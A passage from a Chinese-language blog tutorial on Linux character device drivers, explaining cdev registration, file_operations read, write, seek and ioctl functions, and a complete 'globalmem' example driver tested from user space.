class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">xxx_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    cdev_init(&amp;xxx_dev.cdev, &amp;xxx_fops); <span class="comment">// 初始化cdev</span></span><br><span class="line">    xxx_dev.cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="comment">// 获取字符设备号</span></span><br><span class="line">    <span class="keyword">if</span> (xxx_major) &#123;</span><br><span class="line">        register_chrdev_region(xxx_dev_no, <span class="number">1</span>, DEV_NAME);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alloc_chrdev_region(&amp;xxx_dev_no, <span class="number">1</span>, DEV_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = cdev_add(&amp;xxx_dev.cdev, xxx_dev_no, <span class="number">1</span>); <span class="comment">// 注册设备</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设备驱动模块卸载函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">xxx_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev_region(xxx_dev_no, <span class="number">1</span>); <span class="comment">// 释放占用的设备号</span></span><br><span class="line">    cdev_del(&amp;xxx_dev.cdev);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>2.字符设备驱动的file_operations结构体中的成员函数</strong><br>file_operations结构体中的成员函数是字符设备驱动与内核虚拟文件系统的接口，是用户空间对Linux进行系统调用最终的落实者。<br><strong>代码清单</strong> 字符设备驱动读、写、I/O控制函数模板  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读设备</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">xxx_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, </span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    copy_to_user(buf, ..., ...); <span class="comment">// 内核空间到用户空间缓冲区的复制</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写设备</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">xxx_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, </span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    copy_from_user(..., buf, ...); <span class="comment">// 用户空间缓冲区到内核空间的复制</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ioctl函数</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xxx_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> XXX_CMD1:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> XXX_CMD2:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 不支持的命令</span></span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于用户空间不能直接访问内核空间的内存，因此借助了函数<code>copy_from_user()</code>完成用户空间缓冲区到内核空间的复制，<code>copy_to_user()</code>完成内核空间到用户空间缓冲区的复制。它们的原型如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_from_user</span><span class="params">(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_to_user</span><span class="params">(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
<p>完全复制成功返回值为0，如果复制失败，则返回负值。<br>读和写函数中的<code>__user</code>是一个宏，表明其后的指针指向用户空间，实际上更多地充当了代码自注释功能。<br>在字符设备驱动中，需要定义一个file_operations的实例，并将具体设备驱动的函数赋值给file_operations的成员：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">xxx_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .read = xxx_read,</span><br><span class="line">    .write = xxx_write,</span><br><span class="line">    .unlocked_ioctl = xxx_ioctl,</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上述xxx_fops在 dev_init(&amp;xxx_dev.cdev, &amp;xxx_fops) 语句中建立与cdev的连接。</p>
<h2 id="globalmem虚拟设备驱动"><a href="#globalmem虚拟设备驱动" class="headerlink" title="globalmem虚拟设备驱动"></a>globalmem虚拟设备驱动</h2><p>在globalmem字符设备驱动中会分配一片大小为GLOBALMEM_SIZE(4K)的内存空间，并在驱动中提供对该片内存的读写、控制和定位函数，以供用户空间的进程能通过Linux系统调用获取或设置这片内存的内容。</p>
<h3 id="头文件、宏及设备结构体"><a href="#头文件、宏及设备结构体" class="headerlink" title="头文件、宏及设备结构体"></a>头文件、宏及设备结构体</h3><p><strong>代码清单</strong> globalmem设备结构体和宏  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBALMEM_SIZE    0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBALMEM_MAJOR 230</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalmem_major = GLOBALMEM_MAJOR;</span><br><span class="line">module_param(globalmem_major, <span class="keyword">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">globalmem_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span> <span class="comment">// 字符设备</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> mem[GLOBALMEM_SIZE]; <span class="comment">// 使用的内存</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">globalmem_dev</span> *<span class="title">globalmem_devp</span>;</span></span><br></pre></td></tr></table></figure>

<h3 id="加载与卸载设备驱动"><a href="#加载与卸载设备驱动" class="headerlink" title="加载与卸载设备驱动"></a>加载与卸载设备驱动</h3><p><strong>代码清单</strong> globalmem设备驱动模块的加载与卸载函数  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">globalmem_setup_cdev</span><span class="params">(struct globalmem_dev *dev, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err, devno = MKDEV(globalmem_major, index);</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;dev-&gt;cdev, &amp;globalmem_fops);</span><br><span class="line">    dev-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    err = cdev_add(&amp;dev-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        printk(KERN_NOTICE <span class="string">&quot;Error %d adding globalmem%d&quot;</span>, err, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">globalmem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">dev_t</span> devno = MKDEV(globalmem_major, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (globalmem_major)</span><br><span class="line">        ret = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;globalmem&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;globalmem&quot;</span>);</span><br><span class="line">        globalmem_major = MAJOR(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    globalmem_devp = kzalloc(<span class="keyword">sizeof</span>(struct globalmem_dev), GFP_KERNEL); <span class="comment">// 申请了一份globalmem_dev结构体的内存并清0</span></span><br><span class="line">    <span class="keyword">if</span> (!globalmem_devp) &#123;</span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> fail_malloc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    globalmem_setup_cdev(globalmem_devp, <span class="number">0</span>); <span class="comment">// 完成cdev的初始化和添加</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> fail_malloc:</span><br><span class="line">    unregister_chrdev_region(devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">module_init(globalmem_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">globalmem_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cdev_del(&amp;globalmem_devp-&gt;cdev);</span><br><span class="line">    kfree(globalmem_devp);</span><br><span class="line">    unregister_chrdev_region(MKDEV(globalmem_major, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_exit(globalmem_exit);</span><br></pre></td></tr></table></figure>
<p>在cdev_init()函数中，与globalmem的cdev关联的file_operations结构体如下：<br><strong>代码清单</strong> globalmem设备驱动的文件操作结构体  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">globalmem_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .llseek = globalmem_llseek,</span><br><span class="line">    .read = globalmem_read,</span><br><span class="line">    .write = globalmem_write,</span><br><span class="line">    .unlocked_ioctl = globalmem_ioctl,</span><br><span class="line">    .open = globalmem_open,</span><br><span class="line">    .release = globalmem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="读写函数"><a href="#读写函数" class="headerlink" title="读写函数"></a>读写函数</h3><p>globalmem设备驱动的读写函数主要是让设备结构体的mem[]数组与用户空间交互数据，并随着访问的字节数变更更新文件读写偏移位置。<br><strong>代码清单</strong> globalmem设备驱动的读写函数  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">globalmem_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, </span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p = *ppos;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count = size;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">globalmem_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; GLOBALMEM_SIZE - p)</span><br><span class="line">        count = GLOBALMEM_SIZE - p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buf, dev-&gt;mem + p, count)) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;read %u bytes(s) from %lu\n&quot;</span>, count, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">globalmem_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p = *ppos;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count = size;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">globalmem_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; GLOBALMEM_SIZE - p)</span><br><span class="line">        count = GLOBALMEM_SIZE - p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(dev-&gt;mem + p, buf, count))</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;written %u bytes(s) from %lu\n&quot;</span>, count, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="seek函数"><a href="#seek函数" class="headerlink" title="seek函数"></a>seek函数</h3><p>seek()函数对文件定位的起始地址可以是文件开头（SEEK_SET，0）、当前位置（SEEK_CUR，1）和文件尾（SEEK_END，2），假设globalmem支持从文件开头和当前位置的相对偏移。<br><strong>代码清单</strong> globalmem设备驱动的seek()函数  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">loff_t</span> <span class="title">globalmem_llseek</span><span class="params">(struct file *filp, <span class="keyword">loff_t</span> offset, <span class="keyword">int</span> orig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">loff_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (orig) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 从文件开头位置seek</span></span><br><span class="line">        <span class="keyword">if</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset &gt; GLOBALMEM_SIZE) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filp-&gt;f_pos = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset;</span><br><span class="line">        ret = filp-&gt;f_pos;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// 从文件当前位置开始seek</span></span><br><span class="line">        <span class="keyword">if</span> ((filp-&gt;f_pos + offset) &gt; GLOBALMEM_SIZE) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((filp-&gt;f_pos + offset) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filp-&gt;f_pos += offset;</span><br><span class="line">        ret = filp-&gt;f_pos;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ret = -EINVAL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ioctl函数"><a href="#ioctl函数" class="headerlink" title="ioctl函数"></a>ioctl函数</h3><p>globalmem设备驱动的ioctl()函数接受MEM_CLEAR命令，这个命令会将全局内存的有效数据长度清0，对于设备不支持的命令，ioctl()函数返回-EINVAL。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">globalmem_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">globalmem_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">        <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, GLOBALMEM_SIZE);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;globalmem is set to zero\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用文件私有数据"><a href="#使用文件私有数据" class="headerlink" title="使用文件私有数据"></a>使用文件私有数据</h3><p>大多数Linux驱动遵循一个”潜规则”，那就是将文件的私有数据private_data指向设备结构体，再用read()、write()、ioctl()、llseek()等函数通过private_data访问设备结构体。对于globalmem驱动而言，私有数据的设置是在globalmem_open()中完成的。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">globalmem_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    filp-&gt;private_data = globalmem_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dF5Kdc1">完整代码下载</a></p>
<h3 id="globalmem驱动在用户空间中的验证"><a href="#globalmem驱动在用户空间中的验证" class="headerlink" title="globalmem驱动在用户空间中的验证"></a>globalmem驱动在用户空间中的验证</h3><p>在globalmem源代码目录中通过<code>make</code>命令编译globalmem驱动，运行：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod globalmem.ko</span><br><span class="line">$ lsmod</span><br><span class="line">Module            Size   Used by</span><br><span class="line">globalmem         1504   0</span><br><span class="line">...</span><br><span class="line">$ sudo mknod &#x2F;dev&#x2F;globalmem c 230 0 #创建设备节点，c表明是字符设备，230是主设备号，0是次设备号</span><br><span class="line">$ sudo chmod 777 &#x2F;dev&#x2F;globalmem</span><br><span class="line">$ echo &quot;hello world&quot; &gt; &#x2F;dev&#x2F;globalmem</span><br><span class="line">$ cat &#x2F;dev&#x2F;globalmem</span><br><span class="line">hello world # 结果证明&quot;hello world&quot;字符串被正确地写入了globalmem字符设备</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br>《Linux设备驱动开发详解——基于最新的Linux 4.0内核》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/" class="post-title-link" itemprop="url">Linux设备驱动（一）内核模块</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-21 09:27:14" itemprop="dateCreated datePublished" datetime="2016-10-21T09:27:14+08:00">2016-10-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
